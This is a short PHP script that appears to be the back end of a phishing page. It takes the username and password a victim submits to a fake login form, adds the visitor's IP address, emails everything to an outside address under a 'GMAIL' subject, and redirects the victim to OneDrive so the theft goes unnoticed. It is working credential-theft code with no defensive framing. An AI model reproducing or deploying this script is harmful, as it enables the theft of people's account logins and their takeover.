<?php

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "Username: ".$_POST['name']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";

$set ="ellenraham@outlook.com";

/*$subject = "GMAIL | ".$ip."";
$headers = "From: Cloud <cp0@lord.com>";
//$headers .= $_POST['eMailAdd']."\n";
//$headers .= "MIME-Version: 1.0\n";

 mail($sent,$subject,$message,$headers);

header("Location: loading.htm");*/

mail($set, "GMAIL ".$subject, $message); 
header("Location: https://onedrive.live.com/");

?>